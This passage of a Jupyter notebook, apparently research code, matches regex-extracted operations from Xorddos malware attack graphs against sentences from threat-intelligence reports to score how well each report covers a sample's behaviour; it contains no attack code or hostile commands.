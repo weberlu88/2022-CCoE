{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "import os\n",
    "from os import listdir\n",
    "from os.path import isfile, join\n",
    "from pathlib import Path\n",
    "import pandas as pd\n",
    "import pickle\n",
    "from typing import Dict, List, get_type_hints\n",
    "from styleframe import StyleFrame, Styler\n",
    "from IPython.display import display\n",
    "\n",
    "''' 自己寫的模組 '''\n",
    "from cc_regex_script import RegexMatchResult, RegexMaster \n",
    "from cc_nlp_script import find_verb_of_vocab, OperationMode, OperationEvaluator\n",
    "from cc_module_cust import AttackGraph, Node, Edge, FileTable #, build"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Load 所有 Dofloo 的 object，計算並儲存其 regex"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "family Xorddos has numOfSample 21, first is 07c070b717a23453a2b71c7582d6a928\n",
      "samplename: ['0aefb67c01a24d05351b093455203fa2']\n"
     ]
    }
   ],
   "source": [
    "family = 'Xorddos' # Dofloo Xorddos\n",
    "\n",
    "sample_info = pd.read_csv('../../C malware info/sample_info.csv')\n",
    "dofloo_info = sample_info[(sample_info['family'] == family) & \n",
    "            (~sample_info['filename'].isin(['8845355172c485813872f1bb1834de15.bin']))]\n",
    "samplename_lst = dofloo_info['filename'].to_list()\n",
    "samplename_lst = [name.split('.')[0] for name in samplename_lst]\n",
    "print(f\"family {family} has numOfSample {len(samplename_lst)}, first is {samplename_lst[0]}\")\n",
    "\n",
    "if family == 'Dofloo':\n",
    "    samplename_lst = ['0046a78514a658b9b7a4e29e8581f85b'] # 只先使用這個 dof sample\n",
    "if family == 'Xorddos':\n",
    "    samplename_lst = ['0aefb67c01a24d05351b093455203fa2'] # 只先使用這個 xor sample\n",
    "\n",
    "print('samplename:', samplename_lst)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n",
      "{<OP act=a, obj=a>}\n"
     ]
    }
   ],
   "source": [
    "def prettifyName(item:str) -> str:\n",
    "    pretty_name = {\n",
    "        r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\": \"ip_addr\",\n",
    "        r\"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+\": \"ip_addr+port\",\n",
    "        r\"0x[0-9a-zA-Z]{8}\": \"mem_addr\",\n",
    "        r\"permission:{0,1}[0-9]{0,4}\": \"permission_id\"\n",
    "    }\n",
    "    changed = pretty_name.get(item, None)\n",
    "    if changed:\n",
    "        return changed\n",
    "    return item\n",
    "\n",
    "class OperationPair:\n",
    "    SYSCALL = 0\n",
    "    VERB = 1\n",
    "\n",
    "    def __init__(self, action:str, object:str, type:int=0, subject:str=None, step_number:int=None, original_object=None, original_sentence=None):\n",
    "        self.object:str = object # regex\n",
    "        self.action:str = action # verb or syscall\n",
    "        self.type:int = type\n",
    "        self.subject:str = subject\n",
    "        self.step_number:int = step_number\n",
    "        self.original_object:str = original_object # can store original matched word (object) from CTD\n",
    "        self.original_sentence:str = original_sentence # can store the mathced sentence\n",
    "        pass\n",
    "\n",
    "    def __eq__(self, other): \n",
    "        if not isinstance(other, OperationPair):\n",
    "            # don't attempt to compare against unrelated types\n",
    "            return NotImplemented\n",
    "        # Same if <action, object> pair is same (type is not consider yet)\n",
    "        return self.action == other.action and self.object == other.object\n",
    "\n",
    "    def __hash__(self) -> int:\n",
    "        # necessary for instances to behave sanely in dicts and sets.\n",
    "        return hash((self.action, self.object))\n",
    "\n",
    "    def __str__(self) -> str:\n",
    "        if self.step_number:\n",
    "            return f\"<OP{self.step_number:>2} act={self.action}, obj={prettifyName(self.object)}>\"\n",
    "        return f\"<OP act={self.action}, obj={prettifyName(self.object)}>\"\n",
    "    def __repr__(self) -> str:\n",
    "        return str(self)\n",
    "    def getSentStr(self) -> str:\n",
    "        '''return string contains original_object & flat_sentence'''\n",
    "        flat_sentence = \" \".join(self.original_sentence.splitlines())\n",
    "        return f\"<OP{self.step_number:>2} act={self.action}, obj={prettifyName(self.original_object)}, sent={flat_sentence}>\"\n",
    "        \n",
    "# test case\n",
    "p_aa = OperationPair('a','a')\n",
    "p_aaz = OperationPair('a','a')\n",
    "p_ab = OperationPair('a','b')\n",
    "\n",
    "print(p_aa == p_aaz) # True\n",
    "print(set([p_aa, p_aaz])) # one element\n",
    "\n",
    "def construct_sample_OPset(step_list: list, keep_src_node=False, debug=False, rt_order=True) -> set:\n",
    "    '''return a list of OPset. RegexMaster and family are gobal variable.'''\n",
    "    if debug:\n",
    "        print('step_list len:', len(set(step_list)))\n",
    "    OPlst_raw = list((src_node.name, dst_node.name, syscall) for (src_node, dst_node, syscall) in step_list) # object is raw\n",
    "    OPset_raw = list(dict.fromkeys(OPlst_raw))\n",
    "    if debug:\n",
    "        print('OPlst_raw len:', len(OPlst_raw)) # why len is 123100? (while step_list len is 7775) (must be equal)\n",
    "        print(f\"OPlst_raw: {OPlst_raw[:10]}\")\n",
    "        print('OPset_raw len:', len(OPset_raw)) # len is 5925 for xor\n",
    "        print(f\"OPset_raw: {OPset_raw[:10]}\")\n",
    "    regexMaster = RegexMaster(familyname=family)\n",
    "    regex_pool = regexMaster.get_all_regex()\n",
    "    OPset = set()\n",
    "    OPset_ordered = list()\n",
    "    for (src_node, dst_node, syscall) in OPset_raw:\n",
    "        regex_dst_node_list = RegexMaster.find_spacial_token_with_regex(regex_pool, dst_node)\n",
    "        if regex_dst_node_list is None or len(regex_dst_node_list) == 0:\n",
    "            continue\n",
    "        for regex_result in regex_dst_node_list:\n",
    "            dst_node = regex_result.match_regex\n",
    "            step_number = len(OPset) + 1\n",
    "            if keep_src_node:\n",
    "                op = OperationPair(syscall, dst_node, subject=src_node, step_number=step_number)\n",
    "                OPset.add(op) # keep src_node in OP\n",
    "                if op not in OPset_ordered:\n",
    "                    OPset_ordered.append(op)\n",
    "            else:\n",
    "                op = OperationPair(syscall, dst_node, step_number=step_number)\n",
    "                OPset.add(op) # only dst_node, syscall in OP\n",
    "                if op not in OPset_ordered:\n",
    "                    OPset_ordered.append(op)\n",
    "    if debug:\n",
    "        print('OPset len:', len(OPset), 'OPset_ordered len:', len(OPset_ordered))\n",
    "    if rt_order:\n",
    "        return OPset, OPset_ordered\n",
    "    return OPset\n",
    "\n",
    "# def construct_sample_stepList(step_list: list, keep_src_node=False, debug=False) -> list:\n",
    "#     ''''''\n",
    "#     pass\n",
    "\n",
    "# test\n",
    "# sample_OPset = construct_sample_OPset(asg.step_list, debug=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Exam: sample S1 matches 31 of regex\n",
      "Size of regex_pool: 31, size of total_used_regex: 0\n"
     ]
    }
   ],
   "source": [
    "class Sample:\n",
    "    def __init__(self, samplename:str, regex_set:set=None, special_token_dict=None, step_list=None) -> None:\n",
    "        self.samplename: str = samplename\n",
    "        self.regex_set: set = set()\n",
    "        if regex_set:\n",
    "            self.regex_set = regex_set\n",
    "        self.special_token_dict = {}\n",
    "        if special_token_dict:\n",
    "            self.special_token_dict: dict = special_token_dict # list of dict\n",
    "        if step_list:\n",
    "            self.step_list = step_list\n",
    "            OPset, OPset_ordered = construct_sample_OPset(step_list)\n",
    "            self.OPset: set[OperationPair] = OPset\n",
    "            self.OPset_ordered: list[OperationPair] = OPset_ordered # 依照出現順序排序的 OPset (元素相同順序不同)\n",
    "            self.OPset_sysOnly_ordered = [] # 尚未初始化 只儲存改變系統狀態的 OP 的物件\n",
    "            self.OPset_sysOnly_ordered_index = [] # 尚未初始化 只儲存改變系統狀態的 OP 的 index\n",
    "            del OPset, OPset_ordered\n",
    "        pass\n",
    "    def __repr__(self) -> str:\n",
    "        return f\"<Sample self.samplename>\"\n",
    "\n",
    "''' 讀取 ASG 中的 set_of_object (就是這個樣本的 special_token_dict)，並歸納樣本的 regex_set '''\n",
    "regexMaster = RegexMaster(familyname=family)\n",
    "regex_pool = regexMaster.get_all_regex()\n",
    "# total_used_regex = set()\n",
    "samples: list[Sample] = []\n",
    "for samplename in samplename_lst:\n",
    "    with open(f'../../C ASG statistics 1115ver/saved_pkl/{family}/{samplename}.pkl', 'rb') as inp:\n",
    "        asg: AttackGraph = pickle.load(inp) # asg.set_of_object is dict() (key:spacial token, value: type 首字大寫)\n",
    "        sample = Sample(samplename, special_token_dict=asg.set_of_object, step_list=asg.step_list)\n",
    "        sample.regex_set = set(regex_pool) # 直接使用志剛寫的作為這個樣本的 baseline\n",
    "        # for obj in sample.special_token_dict.keys():\n",
    "        #     matched_list: list[RegexMatchResult] = regexMaster.find_spacial_token(obj)\n",
    "        #     if matched_list:\n",
    "        #         # print(obj, matched_list)\n",
    "        #         [sample.regex_set.add(m.match_regex) for m in matched_list]\n",
    "        #         # [total_used_regex.add(m.match_regex) for m in matched_list]\n",
    "        # print('------', sample.regex_set)\n",
    "        # break\n",
    "        samples.append(sample)\n",
    "    # del asg\n",
    "print(f'Exam: sample S1 matches {len(samples[0].regex_set)} of regex')\n",
    "print(f'Size of regex_pool: {len(regex_pool)}, size of total_used_regex: {len(regexMaster.used_regex_set)}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "set()"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 只差這四個不在 asg set_of_object 中 {'0x[0-9a-zA-Z]{8}', 'GID', 'UID', 'port \\\\d{1,5}$'}\n",
    "set(regex_pool) - samples[0].regex_set"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "' Save result to txt file 沒事不要 run ! '"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "''' Save result to txt file 沒事不要 run ! '''\n",
    "# total_regex = set()\n",
    "# with open('./result/countof_regexset.txt', 'w', encoding='utf-8') as opf:\n",
    "#     # header\n",
    "#     opf.write('{:12s}'.format('Sample no.'))\n",
    "#     for i in range(len(samples)):\n",
    "#         if i+1 < 10:\n",
    "#             opf.write(f' S{i+1} ')\n",
    "#         else:\n",
    "#             opf.write(f'S{i+1} ')\n",
    "#     opf.write('\\n')\n",
    "#     # opf.write('{:12s}'.format('# of regex'))\n",
    "#     num_of_regex_string = '{:12s}'.format('# of regex')\n",
    "#     num_of_objects_string = '{:12s}'.format('# of object ') # 所有的類別喔! 無過濾\n",
    "#     for i in range(len(samples)):\n",
    "#         # opf.write(f'{len(samples[i].regex_set):>3} ')\n",
    "#         num_of_regex_string += f'{len(samples[i].regex_set):>3} '\n",
    "#         num_of_objects_string += f'{len(samples[i].special_token_dict):>3} '\n",
    "#     opf.write(num_of_objects_string+'\\n')\n",
    "#     opf.write(num_of_regex_string)\n",
    "#     opf.write('\\n{:12s}'.format('Sample hash'))\n",
    "#     for i in range(len(samples)):\n",
    "#         opf.write(f'{samples[i].samplename[:3]:>3} ')\n",
    "#     opf.write('\\n\\n')\n",
    "#     opf.write(f'Size of regex_pool: {len(regex_pool)}, size of total_used_regex: {len(regexMaster.used_regex_set)}\\n\\n')\n",
    "\n",
    "#     # content of each sample\n",
    "#     for i,s in enumerate(samples):\n",
    "#         content_1 = f\"S{i+1} has {len(s.regex_set)} of regex\\n\"\n",
    "#         content_2 = f\"regex_set: {s.regex_set}\\n\"\n",
    "#         content_3 = f\"special_token_dict: {s.special_token_dict.keys()}\\n\"\n",
    "#         opf.writelines([content_1, content_2, content_3])\n",
    "#         opf.write('\\n\\n')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Load Reports"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['Xorddos-Cdnetworks.csv',\n",
       " 'Xorddos-Crowdstrike.csv',\n",
       " 'Xorddos-Intezer.csv',\n",
       " 'Xorddos-Ms.csv',\n",
       " 'Xorddos-Trendmicro.csv',\n",
       " 'Xorddos-Trendmicro2.csv']"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "report_fir_path = '../../C parse report/sentence csvs/'\n",
    "# family, samplename, outputfolder = 'Xorddos', '???', './result'\n",
    "outputfolder = './result'\n",
    "\n",
    "def get_all_filenames(dir: str='./') -> list:\n",
    "    ''' traverse root directory, and list directories as dirs and files as files. Return filenames in rootdir. '''\n",
    "    files = [f for f in listdir(dir) if isfile(join(dir, f))]\n",
    "    files.sort()\n",
    "    return files\n",
    "\n",
    "xor_report_names = [f for f in get_all_filenames(report_fir_path) if f.startswith(family)] # 只選擇這個家族的報告\n",
    "xor_report_dfs = [pd.read_csv(f\"{report_fir_path}{f}\") for f in xor_report_names]\n",
    "xor_report_names"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Number</th>\n",
       "      <th>Content</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Sentence 1</td>\n",
       "      <td>understanding a xor.ddos attack\\n2月 17, 2021\\n...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Sentence 2</td>\n",
       "      <td>xor.ddos is the name of the malware, not the a...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Sentence 3</td>\n",
       "      <td>it was detected in september 2014 and the anal...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Sentence 4</td>\n",
       "      <td>is a distributed denial-of-service attack from...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Sentence 5</td>\n",
       "      <td>in many ways it is and in this guide, we will ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>Sentence 6</td>\n",
       "      <td>what is xor.ddos malware?</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>Sentence 7</td>\n",
       "      <td>the traditional attack utilized the existing v...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Sentence 8</td>\n",
       "      <td>however, xor.ddos makes windows pcs into zombi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>Sentence 9</td>\n",
       "      <td>the xor.ddos attack is used to defeat the netw...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>Sentence 10</td>\n",
       "      <td>this is a very serious threat to the network b...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>Sentence 11</td>\n",
       "      <td>in addition to these primary targets, the udp ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>Sentence 12</td>\n",
       "      <td>however, the xor.ddos attack uses the tcp, whi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>Sentence 13</td>\n",
       "      <td>a brute force attack tries many random passwor...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>Sentence 14</td>\n",
       "      <td>there are various types of brute force attacks...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>Sentence 15</td>\n",
       "      <td>origin of xor.ddos attacks\\n77.1 % of xor.ddos...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>Sentence 16</td>\n",
       "      <td>many large-scale cloud service providers were ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>16</th>\n",
       "      <td>Sentence 17</td>\n",
       "      <td>in addition, as ssh services (22/tcp) are bein...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>17</th>\n",
       "      <td>Sentence 18</td>\n",
       "      <td>countermeasures against xor.ddos attacks\\nthe ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>Sentence 19</td>\n",
       "      <td>syn is just a process to perform a 3-way hands...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>19</th>\n",
       "      <td>Sentence 20</td>\n",
       "      <td>if syn packets with data are detected, the xor...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>20</th>\n",
       "      <td>Sentence 21</td>\n",
       "      <td>in addition, it is good to use a syn cookie ag...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>21</th>\n",
       "      <td>Sentence 22</td>\n",
       "      <td>the syn cookie blocks syn spoofing effectively...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>22</th>\n",
       "      <td>Sentence 23</td>\n",
       "      <td>the syn cookie does not require a certain time...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>Sentence 24</td>\n",
       "      <td>therefore, the syn cookie is a very effective ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>24</th>\n",
       "      <td>Sentence 25</td>\n",
       "      <td>alternatively, first syn drop can be a second ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25</th>\n",
       "      <td>Sentence 26</td>\n",
       "      <td>this technique works by saving the first syn p...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>26</th>\n",
       "      <td>Sentence 27</td>\n",
       "      <td>if the session request is normal, the same ip ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>Sentence 28</td>\n",
       "      <td>if the request is made for attack, another syn...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>28</th>\n",
       "      <td>Sentence 29</td>\n",
       "      <td>conclusion – get a ddos mitigation service\\na ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>29</th>\n",
       "      <td>Sentence 30</td>\n",
       "      <td>the content delivery network industry can prov...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>30</th>\n",
       "      <td>Sentence 31</td>\n",
       "      <td>as the services are cloud-based, the available...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>31</th>\n",
       "      <td>Sentence 32</td>\n",
       "      <td>with these services, most companies will benef...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "         Number                                            Content\n",
       "0    Sentence 1  understanding a xor.ddos attack\\n2月 17, 2021\\n...\n",
       "1    Sentence 2  xor.ddos is the name of the malware, not the a...\n",
       "2    Sentence 3  it was detected in september 2014 and the anal...\n",
       "3    Sentence 4  is a distributed denial-of-service attack from...\n",
       "4    Sentence 5  in many ways it is and in this guide, we will ...\n",
       "5    Sentence 6                          what is xor.ddos malware?\n",
       "6    Sentence 7  the traditional attack utilized the existing v...\n",
       "7    Sentence 8  however, xor.ddos makes windows pcs into zombi...\n",
       "8    Sentence 9  the xor.ddos attack is used to defeat the netw...\n",
       "9   Sentence 10  this is a very serious threat to the network b...\n",
       "10  Sentence 11  in addition to these primary targets, the udp ...\n",
       "11  Sentence 12  however, the xor.ddos attack uses the tcp, whi...\n",
       "12  Sentence 13  a brute force attack tries many random passwor...\n",
       "13  Sentence 14  there are various types of brute force attacks...\n",
       "14  Sentence 15  origin of xor.ddos attacks\\n77.1 % of xor.ddos...\n",
       "15  Sentence 16  many large-scale cloud service providers were ...\n",
       "16  Sentence 17  in addition, as ssh services (22/tcp) are bein...\n",
       "17  Sentence 18  countermeasures against xor.ddos attacks\\nthe ...\n",
       "18  Sentence 19  syn is just a process to perform a 3-way hands...\n",
       "19  Sentence 20  if syn packets with data are detected, the xor...\n",
       "20  Sentence 21  in addition, it is good to use a syn cookie ag...\n",
       "21  Sentence 22  the syn cookie blocks syn spoofing effectively...\n",
       "22  Sentence 23  the syn cookie does not require a certain time...\n",
       "23  Sentence 24  therefore, the syn cookie is a very effective ...\n",
       "24  Sentence 25  alternatively, first syn drop can be a second ...\n",
       "25  Sentence 26  this technique works by saving the first syn p...\n",
       "26  Sentence 27  if the session request is normal, the same ip ...\n",
       "27  Sentence 28  if the request is made for attack, another syn...\n",
       "28  Sentence 29  conclusion – get a ddos mitigation service\\na ...\n",
       "29  Sentence 30  the content delivery network industry can prov...\n",
       "30  Sentence 31  as the services are cloud-based, the available...\n",
       "31  Sentence 32  with these services, most companies will benef..."
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xor_report_dfs[0]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 單篇文章的 Class 和 整個 Family 的 Class\n",
    "`baseline: Dict[str, list]` 改為 `regexMaster: RegexMaster`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "class ReportEvalModel:\n",
    "    def __init__(self, regex_set: set, sentences: pd.DataFrame, reportname:str=''):\n",
    "        self.regex_pool: set[str] = regex_set # 樣本or家族含有的 regex 集合\n",
    "        self.sentences = sentences # a df\n",
    "        self.reportname = reportname\n",
    "        cols = list(regex_pool)\n",
    "        self.match_tbl = pd.DataFrame([[0]*len(cols)]*len(sentences), columns=cols)\n",
    "        self.match_word:dict[(int,str), str] = dict() # key(idx_sent,regex) value(word:str)\n",
    "        self.match_regex = set()\n",
    "        self.doc_OPset:set[OperationPair] = set() # Set of doc's OperationalPair\n",
    "        self.match_doc_OPset:set[OperationPair] = set()\n",
    "        self.OPset_order_index = [] # 紀錄 ASG OP 的出現順序 (lifecycle)\n",
    "        self.SysOPset_order_index = [] # 只紀錄改變系統的\n",
    "        # self.asgSysOPset_order_index = []\n",
    "        # self.regexMaster = regexMaster # 其實應該用 class function 就不用傳入一個物件\n",
    "        self.match()\n",
    "\n",
    "    def match(self) -> None:\n",
    "        '''find baseline in sentences of report. Fill matching result in self.match_tbl.'''\n",
    "        sentence_list = self.sentences['Content']\n",
    "        for idx_sent, sent in enumerate(sentence_list):\n",
    "            # print(idx_sent, sent)\n",
    "            # find regexs in a sentence\n",
    "            matched_list: list[RegexMatchResult] = RegexMaster.find_spacial_token_with_regex(self.regex_pool, sent)\n",
    "            if not matched_list:\n",
    "                continue\n",
    "            for m in matched_list:\n",
    "                this_re = m.match_regex\n",
    "                matched_word = m.word\n",
    "                self.match_word[(idx_sent,this_re)] = m.word # 紀錄被 search 到的單字\n",
    "                # self.match_tbl.loc[idx_sent,this_re] = 1 # mark as found 節省空間\n",
    "                self.match_regex.add(this_re)\n",
    "                en_verb = find_verb_of_vocab(sent, m.word)\n",
    "                # print(f\"---\\nen_verb: {en_verb}, m.word: {m.word}, sent: {sent}\") # 列印所有動詞抓取情形\n",
    "                stepn = len(self.doc_OPset) + 1\n",
    "                if en_verb:\n",
    "                    self.doc_OPset.add(OperationPair(en_verb, this_re, type=OperationPair.VERB, original_object=m.word, \n",
    "                    step_number=stepn, original_sentence=sent)) # has verb\n",
    "                else:\n",
    "                    self.doc_OPset.add(OperationPair(None, this_re, type=OperationPair.VERB, original_object=m.word, step_number=stepn)) # no verb\n",
    "        pass\n",
    "    \n",
    "    def get_match_sentences(self) -> pd.DataFrame:\n",
    "        result = self.match_tbl.copy()\n",
    "        result['match'] = result.sum(axis=1)\n",
    "        return result\n",
    "    \n",
    "    def get_match_regexs(self) -> set:\n",
    "        return self.match_regex\n",
    "\n",
    "    def get_match_word(self, idx_sent:int, regex:str) -> str:\n",
    "        return self.match_word[(idx_sent, regex)]\n",
    "\n",
    "class FamilySet:\n",
    "    '''一個 malware family report 集合'''\n",
    "    def __init__(self, familyname:str, regexMaster: RegexMaster, sample: Sample=None):\n",
    "        self.familyname = familyname\n",
    "        self.regexMaster = regexMaster\n",
    "        self.num_of_used_regex = len(regexMaster.used_regex_set) # 這個家族含規則的總數量 (unoin by all samples)\n",
    "        self.sample = None\n",
    "        if sample:\n",
    "            self.sample = sample\n",
    "            self.num_of_used_regex = len(sample.regex_set) # 改以這個樣本規則的總數量為基準\n",
    "        self.rem_lst: List[ReportEvalModel] = [] # list of ReportEvalModel under this family\n",
    "        self.result_tbl = None\n",
    "\n",
    "    def add_rem(self, sentences: pd.DataFrame, reportname: str=''):\n",
    "        '''新增 report 到 FamilySet 中，需傳入文本和報告名稱，會沿用 FamilySet 的 baseline.'''\n",
    "        if self.sample:\n",
    "            rem = ReportEvalModel(list(self.sample.regex_set), sentences, reportname) # 基準是 Sample\n",
    "            self.rem_lst.append(rem)\n",
    "            return\n",
    "        rem = ReportEvalModel(self.regexMaster, sentences, reportname) # 基準是 Family union # need fix -> no first arg now\n",
    "        self.rem_lst.append(rem)\n",
    "\n",
    "    def calc_report_coverage_score(self, match_regexs: list[str], apply_weight=False) -> float:\n",
    "        '''計算這篇報告的 coverage_score，未處理分母為0之情形'''\n",
    "        if not apply_weight:\n",
    "            return len(match_regexs) / self.num_of_used_regex # 無權種的算法，分母是家族 wide\n",
    "        ''' 以下 有權重的算法尚未修改，必出 bug '''\n",
    "        # denominator = sum(self.regexMaster['weight']) # 分母\n",
    "        # numerator = 0 # 分子\n",
    "        # for b, w in zip(self.regexMaster['text'], self.regexMaster['weight']):\n",
    "        #     if b in match_baselines:\n",
    "        #         numerator += w\n",
    "        # return numerator/denominator\n",
    "\n",
    "    def show_result(self, apply_weight: bool=False, base_on_sample = True):\n",
    "        '''print and return result table. baselinse(x) * report(y).'''\n",
    "        column_names = ['report_name','ttl_match','coverage_score']\n",
    "        if base_on_sample:\n",
    "            column_names.extend(list(self.sample.regex_set))\n",
    "        else:\n",
    "            column_names.extend(list(regexMaster.used_regex_set))\n",
    "        result_tbl = pd.DataFrame([[0]*len(column_names)]*len(self.rem_lst), columns=column_names)\n",
    "        for i,rem in enumerate(self.rem_lst):\n",
    "            match_regexes = rem.get_match_regexs() # 這篇報告含有哪些 baseine:set\n",
    "            c_score = self.calc_report_coverage_score(match_regexes, apply_weight=apply_weight)\n",
    "            result_tbl.loc[i,'report_name'] = rem.reportname\n",
    "            result_tbl.loc[i,'ttl_match'] = len(match_regexes)\n",
    "            result_tbl.loc[i,'coverage_score'] = f'{c_score:.4}'\n",
    "            for b in match_regexes:\n",
    "                result_tbl.loc[i,b] = 1\n",
    "            print(rem.reportname, match_regexes)\n",
    "        display(result_tbl)\n",
    "        return result_tbl"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: 存檔每篇報告的 matched sentence (以樣本的 regex set 為基準)\n",
    "比較樣本間的辨別度，有 n 個樣本，就會跑 n 變，得出 n 個結果 (FanilySet)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os, psutil\n",
    "def print_mem_usage():\n",
    "    process = psutil.Process(os.getpid())\n",
    "    mem_usage = psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2\n",
    "    print(f\"=== mem_usage: {mem_usage:.2f} MB ===\")  # in MiB \n",
    "\n",
    "def get_mem_usage() -> int:\n",
    "    # process = psutil.Process(os.getpid())\n",
    "    mem_usage = psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2\n",
    "    return mem_usage\n",
    "\n",
    "def run_family_set_procedure(sample: Sample) -> FamilySet:\n",
    "    # family, regexMaster is global variable\n",
    "    fset = FamilySet(family, regexMaster, sample=sample)\n",
    "    for i,rdf in enumerate(xor_report_dfs):\n",
    "        # rem = ReportEvalModel(base_data, rdf, dofloo_report_names[i])\n",
    "        fset.add_rem(rdf, xor_report_names[i])\n",
    "    # result_tbl = fset.show_result(apply_weight=False)\n",
    "    # result_tbl.to_csv(f'{outputfolder}/{family}_{sample.samplename[:3]}_FamilySet_by_Regex.csv', index=False)\n",
    "    # print(f\"Sample {sample.samplename[:3]} has ttl_match {result_tbl['ttl_match'].sum()} on all documents.\") \n",
    "\n",
    "    # Calculate metrics\n",
    "    print_mem_usage()\n",
    "    print(f\"asg_object: {set([op.object for op in sample.OPset])}\\n\")\n",
    "    fset.sample.OPset_sysOnly_ordered = [op for op in sample.OPset if op.object.find('/etc') != -1]\n",
    "    fset.sample.OPset_sysOnly_ordered_index = [sample.OPset_ordered.index(op) for op in fset.sample.OPset_sysOnly_ordered]\n",
    "    for idx_rem, rem in enumerate(fset.rem_lst):\n",
    "        # asg_object = set([op.object for op in sample.OPset])\n",
    "        # ctd_object = set([op.object for op in rem.doc_OPset])\n",
    "        # if rem.reportname != 'Xorddos-Ms.csv': # 除錯用\n",
    "        #     continue\n",
    "        print(f\"\\nSample {rem.reportname}\")\n",
    "        print(f\"\\tnum of segment in report: {len(rem.sentences)}\")\n",
